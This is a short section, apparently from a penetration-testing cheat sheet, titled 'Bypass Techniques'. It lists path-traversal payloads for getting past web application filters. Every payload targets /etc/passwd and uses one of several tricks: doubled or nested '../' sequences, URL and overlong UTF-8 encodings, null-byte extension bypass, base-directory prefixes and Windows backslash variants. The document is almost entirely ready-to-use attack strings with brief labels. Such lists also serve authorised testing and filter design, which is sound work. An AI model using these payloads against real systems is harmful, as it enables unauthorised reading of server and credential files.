# Phase 4: Bypass Techniques

#### Bypass Stripped Traversal Sequences

```bash
# When ../ is stripped once
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Nested traversal
..././..././..././etc/passwd
....//....//etc/passwd

# Mixed encoding
..%2f..%2f..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Bypass Extension Validation

```bash
# Null byte injection (older PHP versions)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Path truncation
../../../etc/passwd...............................

# Double extension
../../../etc/passwd.jpg.php
```

#### Bypass Base Directory Validation

```bash
# When path must start with expected directory
/var/www/images/../../../etc/passwd

# Expected path followed by traversal
images/../../../etc/passwd
```

#### Bypass Blacklist Filters

```bash
# Unicode/UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# Overlong UTF-8 encoding
%c0%2e%c0%2e%c0%af

# URL encoding variations
%2e%2e/
%2e%2e%5c
..%5c
..%255c

# Case variations (Windows)
....\\....\\etc\\passwd
```